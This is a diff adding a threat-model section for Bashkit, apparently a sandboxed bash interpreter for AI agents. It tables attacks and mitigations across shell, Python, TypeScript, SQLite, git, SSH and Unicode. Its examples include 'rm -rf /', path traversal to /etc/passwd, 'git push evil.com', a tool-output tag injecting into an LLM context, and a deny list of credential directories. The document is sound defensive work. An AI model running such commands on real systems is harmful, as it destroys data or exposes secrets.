+| export overwrites readonly (TM-INJ-021) | `readonly X=v; export X=new` | Check readonly attribute in export | **MITIGATED** |
+| XML boundary break via tool output (TM-INJ-022) | Script emits `</tool_output>` to inject into LLM context | Escape `&`/`<`/`>` before wrapping output (`sanitizeOutput`) | MITIGATED |
+| Template injection via `#each` data (TM-INJ-023) | Data values contain `{{`/`#each` markers | Template markers escaped in data before interpolation | MITIGATED |
+
+**Variable Expansion:**
+
+Variables expand to literal strings, not re-parsed as commands:
+
+```bash
+# If user_input contains "; rm -rf /"
+user_input="; rm -rf /"
+echo $user_input
+# Output: "; rm -rf /" (literal string, NOT executed)
+```
+
+### Multi-Tenant Isolation (TM-ISO-*)
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Shared filesystem (TM-ISO-001) | Access other tenant files | Separate Bash instances | MITIGATED |
+| Shared memory (TM-ISO-002) | Read other tenant data | Rust memory safety | MITIGATED |
+| Resource starvation (TM-ISO-003) | One tenant exhausts limits | Per-instance limits | MITIGATED |
+| Cross-tenant jq env (TM-ISO-004) | `std::env::set_var()` in jq | Custom jaq context variable | **FIXED** |
+| Cumulative counter bypass (TM-ISO-005) | Repeated `exec()` resets counters | Session-level counters | **MITIGATED** |
+| Memory budget exhaustion (TM-ISO-006) | Unbounded variable/array growth | Per-instance MemoryLimits | **MITIGATED** |
+| Alias leakage (TM-ISO-007) | Aliases from session A visible in B | Per-instance alias HashMap | MITIGATED |
+| Trap handler leakage (TM-ISO-008) | Trap from session A fires in B | Per-instance trap HashMap | MITIGATED |
+| Shell option leakage (TM-ISO-009) | `set -e` in session A affects B | Per-instance SHOPT_* variables | MITIGATED |
+| Exported env var leakage (TM-ISO-010) | `export` in session A visible in B | Per-instance env HashMap | MITIGATED |
+| Array leakage (TM-ISO-011) | Arrays cross sessions | Per-instance array HashMaps | MITIGATED |
+| Working directory leakage (TM-ISO-012) | `cd` in session A changes B's cwd | Per-instance `cwd` | MITIGATED |
+| Exit code leakage (TM-ISO-013) | `$?` from session A visible in B | Per-instance `last_exit_code` | MITIGATED |
+| Concurrent variable leakage (TM-ISO-014) | Race condition leaks vars | Per-instance state, no shared mutables | MITIGATED |
+| Concurrent FS leakage (TM-ISO-015) | Race condition leaks files | Separate `Arc<FileSystem>` per instance | MITIGATED |
+| Snapshot/restore side effects (TM-ISO-016) | `restore_shell_state()` affects others | Snapshot is per-instance | MITIGATED |
+| Adversarial variable probing (TM-ISO-017) | Enumerate common secret var names | Default-empty env, no host env inheritance | MITIGATED |
+| /proc /sys probing (TM-ISO-018) | Read `/proc/self/environ` | VFS has no real /proc or /etc | MITIGATED |
+| jq cross-session env (TM-ISO-019) | `jq 'env.X'` sees other vars | jaq reads from injected global | MITIGATED |
+| Subshell mutation leakage (TM-ISO-020) | Subshell vars leak to parent | Snapshot/restore + per-instance state | MITIGATED |
+| EXIT trap cross-exec leak (TM-ISO-021) | EXIT trap fires in next `exec()` | Reset traps in `reset_for_execution()` | **MITIGATED** |
+| `$?` cross-exec leak (TM-ISO-022) | Exit code from previous `exec()` visible | Reset `last_exit_code` | **MITIGATED** |
+| `set -e` cross-exec leak (TM-ISO-023) | Shell options persist across `exec()` | Reset shell options | **MITIGATED** |
+| `$?` leaks into VFS subprocess (TM-ISO-024) | Parent `last_exit_code` visible in child, causing false `set -e` failures | Child resets `last_exit_code`, `nounset_error`, and traps | **MITIGATED** |
+| Wrapper rebuild drops constructor capabilities (TM-ISO-025) | A binding reset loses limits, policy files, callbacks, or network policy | Canonical capability matrix with executable evidence; rebuilds retain constructor config | **MITIGATED** |
+| Shared ToolRegistry request context (TM-ISO-026) | Concurrent shell/Python/TypeScript calls leak tenant identity or traces | Per-request `ExecutionExtensions`, task-local runtime routing, and callback-owned context | **MITIGATED** |
+| Stale request authority and retained host-extension handles (TM-ISO-027) | A late runtime/transport/callback result crosses completion, or a builtin/tool keeps VFS or request context past completion/cancellation | Shared request budget plus one revocable capability lease, cancellation-aware awaits, deterministic late-use failure, RAII closure/release, and explicit `insert_trusted` escape hatch | **MITIGATED** |
+
+Each [`Bash`] instance is fully isolated. For multi-tenant environments, create
+separate instances per tenant:
+
+```rust
+use bashkit::{Bash, InMemoryFs};
+use std::sync::Arc;
+
+# fn main() {
+// Each tenant gets completely isolated instance
+let tenant_a = Bash::builder()
+    .fs(Arc::new(InMemoryFs::new()))  // Separate filesystem
+    .build();
+
+let tenant_b = Bash::builder()
+    .fs(Arc::new(InMemoryFs::new()))  // Different filesystem
+    .build();
+
+// tenant_a cannot access tenant_b's files or state
+# }
+```
+
+### Internal Error Handling (TM-INT-*)
+
+Bashkit is designed to never crash, even when processing malicious or malformed input.
+All unexpected errors are caught and converted to safe, human-readable messages.
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Builtin panic (TM-INT-001) | Trigger panic in builtin | `catch_unwind` wrapper | MITIGATED |
+| Info leak in panic (TM-INT-002) | Panic exposes secrets | Sanitized error messages | MITIGATED |
+| Date format crash (TM-INT-003) | Invalid strftime: `+%Q` | Pre-validation | MITIGATED |
+| Path leak in errors (TM-INT-004) | Error shows real FS paths | Virtual paths only | MITIGATED |
+| Memory addr in errors (TM-INT-005) | Debug output shows addresses | Display impl hides addresses | MITIGATED |
+| Stack trace exposure (TM-INT-006) | Panic unwinds show call stack | `catch_unwind` prevents propagation | MITIGATED |
+| /dev/urandom empty with head -c (TM-INT-007) | `head -c 16 /dev/urandom` returns empty | Fix virtual device pipe handling | **MITIGATED** |
+| C ABI unwind (TM-INT-008) | Rust panic enters a foreign runtime or leaks details | Catch every exported operation and return a generic error | **MITIGATED** |
+| Binary output bypasses resource limits (TM-INT-009) | Invalid UTF-8 exceeds configured caps when counted as text | Byte-native accumulation and callbacks truncate by exact byte length | **MITIGATED** |
+
+**Panic Recovery:**
+
+All builtins (both built-in and custom) are wrapped with panic catching:
+
+```text
+If a builtin panics, the script continues with a sanitized error.
+The panic message is NOT exposed (may contain sensitive data).
+Output: "bash: <command>: builtin failed unexpectedly"
+```
+
+**Error Message Safety:**
+
+Error messages never expose:
+- Stack traces or call stacks
+- Memory addresses
+- Real filesystem paths (only virtual paths)
+- Panic messages that may contain secrets
+
+### Logging Security (TM-LOG-*)
+
+When the `logging` feature is enabled, Bashkit emits structured logs. Security features
+prevent sensitive data leakage:
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Secrets in logs (TM-LOG-001) | Log `$PASSWORD` value | Env var redaction | MITIGATED |
+| Script leak (TM-LOG-002) | Log script with embedded secrets | Script content disabled by default | MITIGATED |
+| URL credentials (TM-LOG-003) | Log `https://user:pass@host` | URL credential redaction | MITIGATED |
+| API key leak (TM-LOG-004) | Log JWT or API key values | Entropy-based detection | MITIGATED |
+| Log injection (TM-LOG-005) | Script with `\n[ERROR]` | Newline escaping | MITIGATED |
+| Control char injection (TM-LOG-006) | ANSI escapes in logs | Control char filtering | MITIGATED |
+| Log flooding (TM-LOG-007) | Excessive script output | Value truncation | MITIGATED |
+| Large value DoS (TM-LOG-008) | Log very long strings | `max_value_length` limit (200) | MITIGATED |
+
+**Logging Configuration:**
+
+```rust,ignore
+use bashkit::{Bash, LogConfig};
+
+// Default: secure (redaction enabled, script content hidden)
+let bash = Bash::builder()
+    .log_config(LogConfig::new())
+    .build();
+
+// Add custom redaction patterns
+let bash = Bash::builder()
+    .log_config(LogConfig::new()
+        .redact_env("MY_CUSTOM_SECRET"))
+    .build();
+```
+
+**Warning:** Do not use `LogConfig::unsafe_disable_redaction()` or
+`LogConfig::unsafe_log_scripts()` in production.
+
+## Parser Depth Protection
+
+The parser includes multiple layers of depth protection to prevent stack overflow
+attacks:
+
+1. **Configurable depth limit** (`max_ast_depth`, default 100): Controls maximum nesting
+   of compound commands (if/for/while/case/subshell).
+
+2. **Hard cap** (`HARD_MAX_AST_DEPTH = 100`): Even if the caller configures a higher
+   `max_ast_depth`, the parser clamps it to 100. This prevents misconfiguration from
+   causing stack overflow.
+
+3. **Child parser inheritance** (TM-DOS-021): When parsing `$(...)` or `<(...)`,
+   the child parser inherits the *remaining* depth budget and fuel from the parent.
+   This prevents attackers from bypassing depth limits through nested substitutions.
+
+4. **Arithmetic depth limit** (TM-DOS-026): The arithmetic evaluator (`$((expr))`)
+   has its own depth limit (`MAX_ARITHMETIC_DEPTH = 50`) to prevent stack overflow
+   from deeply nested parenthesized expressions.
+
+5. **Parser fuel** (`max_parser_operations`, default 100K): Independent of depth,
+   limits total parser work to prevent CPU exhaustion.
+
+### Python / Monty Security (TM-PY-*)
+
+The `python`/`python3` builtins embed the Monty Python interpreter with VFS bridging.
+Python `pathlib.Path` and `open()` operations are bridged to Bashkit's virtual filesystem.
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Infinite loop (TM-PY-001) | `while True: pass` | Monty time limit (30s) | MITIGATED |
+| Memory exhaustion (TM-PY-002) | Large allocation | Monty max_memory (64MB), also caps collected `print` output | MITIGATED |
+| Stack overflow (TM-PY-003) | Deep recursion | Monty max_recursion (200) | MITIGATED |
+| Shell escape (TM-PY-004) | `os.system()` | Monty has no os.system/subprocess | MITIGATED |
+| Real FS access (TM-PY-005) | `open()` | VFS bridge opens only Bashkit VFS files | MITIGATED |
+| Error info leak (TM-PY-006) | Errors go to stdout | Errors go to stderr, not stdout | MITIGATED |
+| Real FS read (TM-PY-015) | `Path.read_text()` | VFS bridge reads only from Bashkit VFS | MITIGATED |
+| Real FS write (TM-PY-016) | `Path.write_text()` | VFS bridge writes only to Bashkit VFS | MITIGATED |
+| Path traversal (TM-PY-017) | `../../etc/passwd` | VFS path normalization | MITIGATED |
+| Bash/Python VFS isolation (TM-PY-018) | Cross-tenant access | Shared VFS by design; no cross-tenant | MITIGATED |
+| Crash on missing file (TM-PY-019) | Missing file panic | FileNotFoundError raised, not panic | MITIGATED |
+| Network access (TM-PY-020) | Socket/HTTP | Monty has no socket/network module | MITIGATED |
+| VFS mkdir escape (TM-PY-021) | mkdir outside VFS | mkdir operates only in VFS | MITIGATED |
+| VM crash (TM-PY-022) | Malformed input | Parser depth limit + resource limits | MITIGATED |
+| Shell injection (TM-PY-023) | deepagents.py f-strings | Use shlex.quote() | **MITIGATED** |
+| Heredoc escape (TM-PY-024) | Content contains delimiter | Random delimiter | **MITIGATED** |
+| GIL deadlock (TM-PY-025) | execute_sync holds GIL | py.allow_threads() | **MITIGATED** |
+| Config lost on reset (TM-PY-026) | reset() drops limits | Preserve config | **MITIGATED** |
+| JSON recursion (TM-PY-027) | Nested dicts overflow stack | Add depth limit | **MITIGATED** |
+| BashTool.reset() drops config (TM-PY-028) | reset() removes limits | Preserve config (match PyBash) | **MITIGATED** |
+| Silent failure masks script errors (TM-PY-007) | Syntax error swallowed | Syntax errors return a non-zero exit code | MITIGATED |
+| Exit-code spoofing across py/bash (TM-PY-008) | `sys.exit(N)` | Propagates N to bash `$?` | MITIGATED |
+| Degenerate input crash (TM-PY-009) | `python -c ''` | Empty code fails gracefully with an error | MITIGATED |
+| Error text leaks into pipeline (TM-PY-010) | Traceback into stdout | Tracebacks stay on stderr | MITIGATED |
+| Command-subst captures diagnostics (TM-PY-011) | `$(python …)` grabs stderr | Captures stdout only | MITIGATED |
+| Shell escape via `eval`/`exec` (TM-PY-012) | `eval("os.system(...)")` | Monty has no `os.system`/`subprocess`; eval'd code stays in the interpreter | MITIGATED |
+| Unknown CLI options smuggle behavior (TM-PY-013) | Unknown `python` flag | Rejected with exit 2 | MITIGATED |
+| Escapes Bashkit resource limits (TM-PY-014) | Bypass caps via Python | `ExecutionLimits` apply like any builtin | MITIGATED |
+| Host clock disclosure (TM-PY-029) | `datetime.now()` exposes host time/timezone | Intentional, required for correct datetime semantics | ACCEPTED |
+| GIL deadlock/exit crash via async callback (TM-PY-030) | Private-loop dispatch holds the GIL during teardown | Deterministic teardown: detach around dispatch, cancel in-flight callbacks, no attach at finalization | FIXED |
+| ContextVar capture may include sensitive state (TM-PY-031) | `copy_context()` snapshots all caller ContextVars | Accepted: same semantics as `asyncio.Task` inheritance; caller controls what is set | ACCEPTED |
+
+**Architecture:**
+
+```text
+Python code → Monty VM → OsCall pause → Bashkit VFS bridge → resume
+```
+
+Monty runs directly in the host process. Resource limits (memory, time,
+recursion) are enforced by Monty's own runtime. All VFS operations are
+bridged through the host process, Python code never touches the real filesystem.
+
+### SQLite Security (TM-SQL-*)
+
+The `sqlite`/`sqlite3` builtins embed Turso's pure-Rust SQLite-compatible engine.
+This is experimental and **opt-in for now**. Library callers must enable the
+`sqlite` feature, register the builtin with `.sqlite()` or `.sqlite_with_limits(...)`,
+and set `BASHKIT_ALLOW_INPROCESS_SQLITE=1` before SQL executes. Without the
+runtime opt-in, registered commands fail closed with a disabled error.
+
+SQLite database files live in Bashkit's virtual filesystem, or in `:memory:`.
+The default backend loads and flushes database bytes through the VFS at command
+boundaries; the VFS backend implements Turso's IO trait over `Arc<dyn FileSystem>`.
+Both paths are tested so SQL cannot intentionally read host files.
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| BETA engine execution (TM-SQL-001) | `sqlite :memory: 'SELECT 1'` without opt-in | Feature + builder registration + runtime opt-in gate | MITIGATED |
+| Host FS escape (TM-SQL-002) | Open `/etc/passwd` as a database | All paths resolve through Bashkit VFS | MITIGATED |
+| Large SQL input (TM-SQL-003) | Multi-MB SQL script | `max_script_bytes` | MITIGATED |
+| Huge result set (TM-SQL-004) | Query returns millions of rows | `max_rows_per_query` | MITIGATED |
+| Huge DB file (TM-SQL-005) | Load or grow oversized `.sqlite` file | `max_db_bytes` on both backends | MITIGATED |
+| Wall-clock burn (TM-SQL-005a) | Expensive query/CTE | Per-step deadline + interrupt | MITIGATED |
+| Statement flood (TM-SQL-005b) | Millions of `;` statements | `max_statements` | MITIGATED |
+| Binary truncation (TM-SQL-006) | BLOB contains NUL bytes | `Vec<u8>` values, tested round-trip | MITIGATED |
+| CSV injection/escape failure (TM-SQL-007) | Blob/text contains separator | RFC-4180 quoting | MITIGATED |
+| Recursive `.read` (TM-SQL-008) | Script `.read`s itself | `MAX_DOT_READ_DEPTH` | MITIGATED |
+| Cross-database access (TM-SQL-009) | `ATTACH DATABASE '/tmp/x'` | `ATTACH`/`DETACH` rejected by policy | MITIGATED |
+| Dangerous PRAGMAs (TM-SQL-010) | `PRAGMA main."cache_size"=...` | Default `pragma_deny` list, including quoted/schema-qualified names | MITIGATED |
+| Host path errors (TM-SQL-011) | Upstream error includes `/rustc/...` | Sanitizer strips host path annotations | MITIGATED |
+
+Black-box coverage drives `Bash::exec` through
+`tests/sqlite_integration_tests.rs` and `tests/sqlite_security_tests.rs`.
+White-box coverage in `builtins/sqlite/tests.rs` exercises parser, policy,
+formatter, sanitizer, backend, and dot-command internals directly.
+Exploratory probing found and fixed two policy/limit gaps: quoted
+schema-qualified PRAGMAs bypassed the deny list, and VFS-backed databases did
+not honor custom `max_db_bytes` while growing.
+
+### Git Security (TM-GIT-*)
+
+Optional virtual git operations via the `git` feature. All operations are confined
+to the virtual filesystem.
+
+**Repository Access:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Host identity leak (TM-GIT-002) | Commit reveals real name/email | Configurable virtual identity | MITIGATED |
+| Host git config (TM-GIT-003) | Read ~/.gitconfig | No host filesystem access | MITIGATED |
+| Credential theft (TM-GIT-004) | Access credential store | No host filesystem access | MITIGATED |
+| Repository escape (TM-GIT-005) | Clone outside VFS | All paths in VFS | MITIGATED |
+
+**Git DoS:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Large repo clone (TM-GIT-006) | Clone huge repository | FS size limits | PLANNED (Phase 2) |
+| Many git objects (TM-GIT-007) | Millions of objects | `max_file_count` FS limit | MITIGATED |
+| Deep history (TM-GIT-008) | Very long commit log | Log limit parameter | MITIGATED |
+| Large pack files (TM-GIT-009) | Huge .git/objects/pack | `max_file_size` FS limit | MITIGATED |
+
+**Remote Operations (Phase 2):**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Unauthorized clone (TM-GIT-001) | `git clone evil.com` | Remote URL allowlist | PLANNED |
+| Push to unauthorized (TM-GIT-010) | `git push evil.com` | Remote URL allowlist | PLANNED |
+| Fetch from unauthorized (TM-GIT-011) | `git fetch evil.com` | Remote URL allowlist | PLANNED |
+| SSH key access (TM-GIT-012) | Use host SSH keys | HTTPS only (no SSH) | PLANNED |
+| Git protocol bypass (TM-GIT-013) | Use `git://` protocol | HTTPS only | PLANNED |
+| Branch name injection (TM-GIT-014) | `git branch ../../config` | Validate branch names | **MITIGATED** |
+| Terminal-escape injection via git metadata (TM-GIT-015) | Control chars in config/author/commit echoed by `git config`/`git log` | Control characters stripped on output | **MITIGATED** |
+
+**Virtual Identity:**
+
+```rust,ignore
+use bashkit::Bash;
+
+let bash = Bash::builder()
+    .git_author("sandbox", "sandbox@example.com")
+    .build();
+// Commits use virtual identity, never host ~/.gitconfig
+```
+
+### SSH Security (TM-SSH-*)
+
+The `ssh`/`scp`/`sftp` builtins (opt-in `ssh` feature) connect to remote hosts
+through a sandboxed client. Connections are default-deny: callers must allowlist
+each host via `SshConfig::allow(...)`, and credentials come only from the VFS,
+never the host `~/.ssh/`.
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Unauthorized host access (TM-SSH-001) | Connect to arbitrary hosts | Host allowlist (default-deny) | MITIGATED |
+| Credential leakage (TM-SSH-002) | Read host `~/.ssh/` keys | Keys from VFS only | MITIGATED |
+| Session exhaustion (TM-SSH-003) | Open many concurrent sessions | Max concurrent sessions limit | MITIGATED |
+| OOM via large response (TM-SSH-004) | Server sends huge output | Streaming size limit | MITIGATED |
+| Connection hang (TM-SSH-005) | Server never responds | Configurable timeout | MITIGATED |
+| MITM via unverified host key (TM-SSH-006) | Attacker intercepts connection | Strict host key checking (default: on) | MITIGATED |
+| Non-standard port access (TM-SSH-007) | Connect to services on unexpected ports | Port allowlist | MITIGATED |
+| Remote command injection (TM-SSH-008) | Inject via remote path in SCP | Shell-escape remote paths | MITIGATED |
+
+### TypeScript / ZapCode Security (TM-TS-*)
+
+The `typescript` feature embeds the ZapCode runtime. Scripts run under
+wall-clock, memory, allocation, and stack-depth limits, and all filesystem
+access is bridged through Bashkit's VFS, never the host filesystem.
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Infinite loop (TM-TS-001) | `while (true) {}` | ZapCode time limit (default 30s) | MITIGATED |
+| Memory exhaustion (TM-TS-002) | Large allocation | `max_memory` (64MB) + `max_allocations` (1M) | MITIGATED |
+| Stack overflow (TM-TS-003) | Deep recursion | `max_stack_depth` (512) | MITIGATED |
+| Allocation bomb (TM-TS-004) | Many small objects | `max_allocations` (1M) | MITIGATED |
+| Real filesystem read (TM-TS-005) | Read host files via VFS | VFS bridge reads only Bashkit VFS | MITIGATED |
+| VFS write escape (TM-TS-006) | Write to host | VFS bridge writes only Bashkit VFS | MITIGATED |
+| Path traversal (TM-TS-007) | `../../etc/passwd` | Paths resolved within sandbox | MITIGATED |
+| Host `/tmp` escape (TM-TS-011) | Operations escape to host | All operations through Bashkit VFS | MITIGATED |
+| Limit bypass (TM-TS-018) | Evade Bashkit caps via TS | Command budget still enforced | MITIGATED |
+| Bash/TS VFS data corruption (TM-TS-008) | Cross-tenant VFS access | Shared VFS by design; no cross-tenant access | MITIGATED |
+| Crash on missing file (TM-TS-009) | Open a missing file | Error string returned, not a panic | MITIGATED |
+| VFS mkdir escape (TM-TS-010) | mkdir outside VFS | mkdir operates only in VFS | MITIGATED |
+| Error info leak via stdout (TM-TS-012) | Errors to stdout | Errors go to stderr, not stdout | MITIGATED |
+| Syntax error crashes host (TM-TS-013) | Malformed TS | Non-zero exit, error on stderr | MITIGATED |
+| Exit code not propagated (TM-TS-014) | `process.exit(N)` | Exit code flows to bash `$?` | MITIGATED |
+| Empty code crashes (TM-TS-015) | `ts -c ''` | Non-zero exit, error message | MITIGATED |
+| Pipeline error leakage (TM-TS-016) | Errors into pipe | Errors on stderr, not passed to the pipe | MITIGATED |
+| Unknown options accepted (TM-TS-017) | Unknown flag | Unknown flags return non-zero | MITIGATED |
+| Command-subst captures errors (TM-TS-019) | `$(ts …)` grabs stderr | Only stdout captured | MITIGATED |
+| Shell execution from TS (TM-TS-021) | `child_process` / exec globals | No process/subprocess/exec globals | MITIGATED |
+| Script reads host filesystem (TM-TS-022) | Load a host script | Script file loaded via VFS | MITIGATED |
+| Shebang line injection (TM-TS-023) | `#!...` header | Shebang stripped safely | MITIGATED |
+| Bash var expansion injection (TM-TS-020) | Unquoted `$VAR` expanded before TS runs | By design; use single quotes to prevent expansion | MITIGATED |
+
+Per-threat coverage (TM-TS-001 … TM-TS-023), including error-isolation and
+exit-code propagation cases, is also exercised by the `threat_ts_*` tests.
+
+### Request Signing & Snapshot Integrity (TM-CRY-*, TM-SNAP-*)
+
+The `bot-auth` request signer (Ed25519, RFC 9421) and the snapshot
+serialization API both handle key material and integrity tags. The optional
+`ssh` feature also brings in third-party RSA code, covered below.
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Private key recovery (TM-CRY-001) | Heap/core-dump inspection of the Ed25519 seed | `BotAuthConfig` zeroizes the seed in `Drop`; debug output redacts key material | MITIGATED |
+| RSA timing sidechannel (TM-CRY-002) | A peer times RSA private-key operations during SSH public-key auth to recover the key (Marvin Attack, RUSTSEC-2023-0071) | No upstream fix exists, every published `rsa` version is affected. The crate is reachable only through the opt-in `ssh` feature (via `russh`/`ssh-key`); prefer Ed25519 keys, which do not use the affected path | ACCEPTED |
+| Snapshot forgery (TM-SNAP-001) | Forge a valid digest using the public `BKSNAP01` tag | Keyed HMAC API (`to_bytes_keyed`/`from_bytes_keyed`) for tamper-evident snapshots | MITIGATED |
+| Object store poisoning (TM-SNAP-002) | Substitute a different blob under a referenced object ID in the host's store | Every object is verified against its content hash on load; the graph is a Merkle tree, so a keyed commit authenticates everything it reaches | MITIGATED |
+| Hash agility (TM-SNAP-003) | A snapshot claims a hash algorithm the reader does not implement | Algorithm ID in the container header, rejected when unknown | MITIGATED |
+| Chunk or decompression bomb (TM-SNAP-004) | A small snapshot expands into an unbounded allocation during checkout | Per-object decompression capped; live filesystem file-size and total-byte limits enforced before chunk materialization | MITIGATED |
+| Malformed object graph (TM-SNAP-005) | Cyclic parents, absurd declared entry counts, or a chunk served where a tree is expected | Kind tags checked against context, declared counts bounded before allocation, ancestry walks track visited commits | MITIGATED |
+| Capability mismatch on restore (TM-SNAP-006) | State captured with tools or features the restoring instance lacks is restored into it silently | Per-commit capability fingerprint with a `Superset` default policy, plus state-evidence checks that fire under every policy | MITIGATED |
+
+`from_bytes` uses `SHA-256(BKSNAP01 || payload)` (the tag is a public constant,
+so it detects accidental corruption, not forgery); `from_bytes_keyed` uses
+`HMAC-SHA256(secret_key, payload)` with a caller-provided key for authenticity.
+
+Within a commit graph every object is named by `SHA-256(kind || payload)` and
+re-verified when loaded, so authenticating the root commit transitively
+authenticates the shell state, tree, and file chunks beneath it. Note that
+object identity covers *decoded* content, not its compressed framing: a host
+may recompress its store freely, while bytes appended after a compressed stream
+are rejected.
+
+### Host Filesystem Security (TM-FS-*)
+
+Two features let a script reach storage outside the in-memory VFS: the `realfs`
+feature, which mounts real host directories (read-only by default, gated by an
+allowlist), and the wasm bindings' `new Bash({ fs })`, which routes the VFS into
+an embedder-supplied JavaScript object.
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Permissive RealFs mount (TM-FS-013) | `mount_real_readonly_at("/", …)` exposes the whole host | Allowlist-first: broad roots (`/`, `/etc`, `/root`, `/home`, …) and any path component matching `.ssh`, `.aws`, `.kube`, `.docker`, `.gnupg`, `.gcloud` are refused unless explicitly allowlisted | MITIGATED |
+| Partial filesystem mutation (TM-FS-014) | Failed write/copy or cross-mount move leaves corruption, duplication, or retained quota | Failure-atomic `FileSystem` contract; RealFs sibling staging; MountableFs destination rollback; NamespaceFs cross-device rejection; shared conformance + failpoint tests | MITIGATED |
+| Partial tar extraction (TM-FS-015) | A late unsafe or malformed entry leaves earlier files behind | Validate the complete archive and file limits before the first VFS mutation | MITIGATED |
+| yq in-place partial update (TM-FS-016) | A failed transform or write truncates the source file | Evaluate and serialize before writing; random sibling temporary file, mode preservation, and rename-on-success | MITIGATED |
+| JS host filesystem widens the sandbox (TM-FS-017) | `new Bash({ fs })` gives a script whatever the embedder's object exposes | Paths are normalized by `PosixFs` before any host call, and reads of host-reported symlinks are rejected before reaching a potentially symlink-following host method. The host object *is* the boundary and is the embedder's to scope; its bytes also live outside the VFS quotas, so the embedder owns the storage limit | ACCEPTED (opt-in, embedder-scoped) |
+
+### Unicode Security (TM-UNI-*)
+
+Unicode input from untrusted scripts creates attack surface across the parser, builtins,
+and virtual filesystem. AI agents frequently generate multi-byte Unicode (box-drawing,
+emoji, CJK) that exercises these code paths.
+
+**Byte-Boundary Safety (TM-UNI-001/002/015/016/017):**
+
+Multiple builtins mix byte offsets with character indices, causing panics on multi-byte
+input. All are caught by `catch_unwind` (TM-INT-001) preventing process crash, but the
+builtin silently fails.
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Awk byte-boundary panic (TM-UNI-001) | Multi-byte chars in awk input | `catch_unwind` catches panic | PARTIAL |
+| Sed byte-boundary panic (TM-UNI-002) | Box-drawing chars in sed pattern | `catch_unwind` catches panic | PARTIAL |
+| Expr substr panic (TM-UNI-015) | `expr substr "café" 4 1` | `catch_unwind` catches panic | PARTIAL |
+| Printf precision panic (TM-UNI-016) | `printf "%.1s" "é"` | `catch_unwind` catches panic | PARTIAL |
+| Cut/tr byte-level parsing (TM-UNI-017) | `tr 'é' 'e'`, multi-byte in char set | `catch_unwind` catches; silent data loss | PARTIAL |
+
+**Additional Byte/Char Confusion:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Interpreter arithmetic (TM-UNI-018) | Multi-byte before `=` in arithmetic | Wrong operator detection; no panic | PARTIAL |
+| Network allowlist (TM-UNI-019) | Multi-byte in allowlist URL path | Wrong path boundary check | PARTIAL |
+
+**Zero-Width and Invisible Characters:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Zero-width in filenames (TM-UNI-003) | Invisible chars create confusable names | Path validation (planned) | MITIGATED |
+| Zero-width in variables (TM-UNI-004) | `\u{200B}PATH=malicious` | Matches Bash behavior | ACCEPTED |
+| Zero-width in scripts (TM-UNI-005) | `echo "pass\u{200B}word"` | Correct pass-through | ACCEPTED |
+| Tag char hiding (TM-UNI-011) | U+E0001-U+E007F in filenames | Path validation (planned) | MITIGATED |
+| Annotation hiding (TM-UNI-012) | U+FFF9-U+FFFB in filenames | Not detected | MITIGATED |
+| Deprecated format chars (TM-UNI-013) | U+206A-U+206F in filenames | Not detected | MITIGATED |
+
+**Homoglyphs, Normalization, and Bidi:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Homoglyph filenames (TM-UNI-006) | Cyrillic 'а' vs Latin 'a' | Accepted risk | ACCEPTED |
+| Homoglyph variables (TM-UNI-007) | Cyrillic in variable names | Matches Bash behavior | ACCEPTED |
+| Normalization bypass (TM-UNI-008) | NFC vs NFD create distinct files | Matches Linux FS behavior | ACCEPTED |
+| Bidi in script source (TM-UNI-014) | RTL overrides hide malicious code | Scripts untrusted by design | ACCEPTED |
+
+**Combining Characters:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Excessive combiners in filenames (TM-UNI-009) | 1000 diacritical marks on one char | `max_filename_length` (255 bytes) | MITIGATED |
+| Excessive combiners in builtins (TM-UNI-010) | Combiners in awk/grep patterns | Timeout + depth limits | MITIGATED |
+
+**Safe Components (confirmed by full codebase audit):**
+- Lexer: `Chars` iterator with `ch.len_utf8()` tracking
+- wc: Correct `.len()` vs `.chars().count()` usage
+- grep/jq: Delegate to Unicode-aware regex/jaq crates
+- sort/uniq: String comparison, no byte indexing
+- logging: Uses `is_char_boundary()` correctly
+- python: Shebang strip via `find('\n')`, ASCII delimiter, safe
+- Python bindings (bashkit-python): PyO3 `String` extraction, no manual byte/char ops
+- eval harness: `chars().take()`, `from_utf8_lossy()`, all safe patterns
+- curl/bc/export/date/comm/echo/archive/base64: All `.find()` use ASCII delimiters only
+- scripted_tool: No byte/char patterns
+
+**Path Validation:**
+
+Filenames are validated by `find_unsafe_path_char()` which rejects:
+- ASCII control characters (U+0000-U+001F, U+007F)
+- C1 control characters (U+0080-U+009F)
+- Bidi override characters (U+202A-U+202E, U+2066-U+2069)
+
+Normal Unicode (accented, CJK, emoji) is allowed in filenames and script content.
+
+**Caller Responsibility:**
+- Strip zero-width/invisible characters from filenames before displaying to users
+- Apply confusable-character detection (UTS #39) if showing filenames to humans
+- Strip bidi overrides from script source before displaying to code reviewers
+- Be aware that expr/printf/cut/tr may fail on non-ASCII input until fixes land
+- Use ASCII in network allowlist URL patterns until byte/char fix lands
+
+## Security Testing
+
+Bashkit includes comprehensive security tests:
+
+- **Threat Model Tests**: [`tests/threat_model_tests.rs`][threat_tests] - 232 tests
+- **Unicode Security Tests**: `tests/unicode_security_tests.rs` - TM-UNI-* tests
+- **Nesting Depth Tests**: 18 tests covering positive, negative, misconfiguration,
+  and regression scenarios for parser depth attacks
+- **Fail-Point Tests**: [`tests/security_failpoint_tests.rs`][failpoint_tests] - 14 tests
+- **Network Security**: [`tests/network_security_tests.rs`][network_tests] - 68 tests
